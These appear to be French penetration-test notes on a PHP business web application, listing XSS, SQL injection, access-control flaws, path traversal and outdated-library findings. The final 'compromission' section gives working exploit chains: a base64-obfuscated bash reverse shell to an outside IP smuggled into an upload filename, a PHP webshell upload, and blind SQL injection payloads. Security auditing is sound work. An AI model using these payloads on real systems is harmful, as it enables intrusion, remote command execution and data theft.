## SSRF

Fichier: ajoutConstatMeteo.php
![[screenshot_84.png]]

## CVE PHPMailer 5.2.28

![[Pasted image 20260420143508.png]]

##  CVE dompdf c7dc571

![[Pasted image 20260420143948.png]]

## XSS 

Fichier: consulterConstatCabine.php et consulterConstatChantier.php et consulterConstatMateriel.php et consulterConstatMeteo.php

![[Pasted image 20260420153801.png]]
$d[nom_fichier] peut contenir du code javascript

Cet élément est ajouté en BDD par la méthode `addConstatCabine` dans le fichier `mdl_materiel.php` et est ajoutable depuis le site via la page `ajoutConstatCabine.php`

## SQLi

Fichier: cronMatriceFormations.php (appelé par le fichier accueilMatriceFormations.php)

![[Pasted image 20260420165238.png]]

Fichier: genererPlanningIndisponibilites.php (appelé par le fichier accueilPlanningIndisponibilites.php)
![[Pasted image 20260421102738.png]]
![[Pasted image 20260421102833.png]]

Fichier: matriceCongesEmploye.php (appelé par les fichiers listeCongesEmploye_OLD.php et calendrierConges.php)
![[Pasted image 20260421103212.png]]
![[Pasted image 20260421103229.png]]

Fichier: matriceRechercheFormations.php (appelé par le fichier resultatRechercheFormationsEmploye.php)
![[Pasted image 20260421103510.png]]
![[Pasted image 20260421104337.png]]

![[Pasted image 20260421103726.png]]



## ACL

Le fichier `adminer1.php` est accessible directement et embarque sa propre gestion de session (`adminer_sid`), indépendante de l’authentification de l’application métier. Ainsi, le contrôle d’accès applicatif reposant sur `$_SESSION['droit']` ne protège pas cette interface. Un utilisateur non autorisé peut donc atteindre l’interface Adminer et tenter une authentification directe à la base de données.

fichier: recup_ajax.php
![[Pasted image 20260421151335.png]]

Toute les fonctions sont appelable depuis une requête côté client. ça laisse accès à des fonctions critiques tel que
![[Pasted image 20260421151605.png]]
Ici on peut créer une requête en spécifiant fonction=connexionAdmin&&idUser=1 et on peut devenir admin de cette façon

![[Pasted image 20260421151725.png]]
On peut aussi bypass la connexion en spécifiant palpatine dans la requête ce qui nous permet d'avoir la session id=1




## RCE

Fichier: consulterEvenement.php
![[Pasted image 20260421100951.png]]

![[Pasted image 20260421101009.png]]

![[Pasted image 20260421101020.png]]

Regarder si on ne peut pas maitriser les valeurs dans la variable plan et programme

Fichier: genererFormulaireAccueilChantier2.php
![[Pasted image 20260421102430.png]]
![[Pasted image 20260421102449.png]]

fichier genererCauserie.php 

Appelé par les fichiers suivants:
![[Pasted image 20260421115202.png]]

![[Pasted image 20260421114700.png]]
![[Pasted image 20260421114620.png]]
## Creds admin FTP

Fichier: consulterEvenement.php
![[Pasted image 20260421101150.png]]

## Utilisation de mcrypt_create_iv de nombreuses fois

Fichier: consulterEvenement.php
![[Pasted image 20260421101556.png]]

## Path traversal

fichier: cpns (appelé par le fichier choixFichiersZipCatalogueTotal.php)

![[Pasted image 20260421105239.png]]

![[Pasted image 20260421105223.png]]
Ecraser d'autre ZIP sur le serveur

![[Pasted image 20260421105355.png]]
Peut permettre d'écrire un fichier zip dans un autre dossier -> RCE potentiel 

![[Pasted image 20260421105604.png]]
Si on maitrise la valeur de $doc, on peut récupérer d'autres dossier sur le serveur via path traversal


## Chemin de compromission

### Scénario 1

Dans le fichier consulterEvenement.php il y a un exec qui est effectué:
```php
exec('convert "upload/'.$plan['chemin'].'.'.$plan['extension'].'" -alpha off -colorspace RGB -page a4 -quality 80 "upload/tmp/'.$tmp.'/img.jpg"', $output, $return_var);
```

Cette exec appel plusieurs variable dont `$plan['chemin']` et `$plan['extension']`

![[Pasted image 20260421153553.png]]

Donc la variable `$plan` agit comme une fome de structure. Il s'agit du dernier document à avoir le `type = PLAN`
Les documents sont récupérés via le méthode `Chantier::getFichiersEvenementChantier`. Voici sa définition:
![[Pasted image 20260421153950.png]]

On voit aussi dans la class `Chantier` qu'il existe une méthode `addFichiersEvenementChantier`
![[Pasted image 20260421154106.png]]

Cette méthode peut être appelé côté client grace à une requête POST sur la route `/recup_ajax.php` en exploitant l'ACL qui permet d'appeler toutes les fonctions backend de ce fichier:

```
POST /recup_ajax.php HTTP/1.1
Host: exemple.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
Cookie: PHPSESSID=xxxx

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="fonction"

addFichiersEvenementChantier
------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="evenement"

test
------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="commentaires"

test
------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="type"

PLAN
------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="fichiers[]"; filename="image.png[$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash)]"
Content-Type: image/png

AAAA
------WebKitFormBoundary7MA4YWxk--
```

ou 

```
echo -n "AAAA" > file.png

curl -X POST http://cible.com/recup_ajax.php \
  -H "Cookie: PHPSESSID=xxxx" \
  -F 'fonction=addFichiersEvenementChantier' \
  -F 'evenement=test' \
  -F 'commentaires=test' \
  -F 'type=PLAN' \
  -F 'fichiers[]=@file.png;filename="image.png[$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMTI5LjkuMTkvODg4OCAwPiYxJw== | base64 -d | bash)]";type=image/png'
```


![[Pasted image 20260421154427.png]]

On peut ensuite déclencher le `exec` dans le fichier consulterEvenement.php:
![[Pasted image 20260422112626.png]]

### Demo

Serveur test php:
```
<?php

if (!isset($_FILES['fichiers'])) {
    die("no file");
}

$rand = bin2hex(random_bytes(4));

$tmp = "tmp_" . $rand;

mkdir($tmp);

for ($i = 0; $i < count($_FILES['fichiers']['name']); $i++) {

    $name = $_FILES['fichiers']["name"][$i];
    echo "RAW filename: $name\n";

    $tabExt = explode('.', $name);
    $exten = $tabExt[count($tabExt) - 1];

    echo "RAW extension: $exten\n";

    $chemin = "file_" . $rand;

    $cmd = 'convert "upload/'.$chemin.'.'.$exten.'" -alpha off output.jpg';

    echo "\n[CMD BUILT]\n$cmd\n\n";

    exec($cmd, $output, $return_var);
}
```

![[Pasted image 20260422112255.png]]

![[screenshot_85.png]]

### Scénario 2

Grace à l'ACL qui permet d'appeler toutes les fonctions du fichier `recup_ajax.ph`, on peux utiliser la méthode `addFichiersEvenementChantier` pour ajouter une payload php dans le repertoire upload

```
POST /recup_ajax.php HTTP/1.1
Host: exemple.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
Cookie: PHPSESSID=xxxx

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="fonction"

addFichiersEvenementChantier
------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="evenement"

test
------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="commentaires"

test
------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="type"

PLAN
------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="payload.php"
Content-Type: application/x-php

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>

------WebKitFormBoundary7MA4YWxk--
```

![[Pasted image 20260423115339.png]]

Cependant, on ne connait pas son chemin. Mais on peut le récupérer via une SQLi comme celle présente dans `genererPlanningIndisponibilites.php`:

![[Pasted image 20260423120439.png]]

![[Pasted image 20260423120453.png]]

On peut donc passer par une SQLi pour connaitre le chemin du fichier qu'on envoi:

Error Based:
```sql
AND (
  SELECT SUBSTRING(
    (SELECT chemin
     FROM CHANTIER_EVENEMENT_DOCUMENT
     WHERE nom_fichier='payload.php'
     LIMIT 1),
  1,1)
) = 'a'
```

```sql
AND (SELECT substr(chemin,1,1) FROM CHANTIER_EVENEMENT_DOCUMENT WHERE nom_fichier='payload.php' LIMIT 1)= 'a' --
```

Time Based:
```sql
1 AND IF(
  SUBSTRING(
    (SELECT chemin
     FROM CHANTIER_EVENEMENT_DOCUMENT
     WHERE nom_fichier='payload.php'
     LIMIT 1),
  1,1
  ) = 'a',
  SLEEP(5),
  0
) --
```

```sql
1 AND IF((SELECT SUBSTR(chemin,1,1) FROM CHANTIER_EVENEMENT_DOCUMENT WHERE nom_fichier='payload.php' LIMIT 1)='a',SLEEP(5),0)--
```

Ensuite on accède au webshell via le nom du fichier qu'on récupère


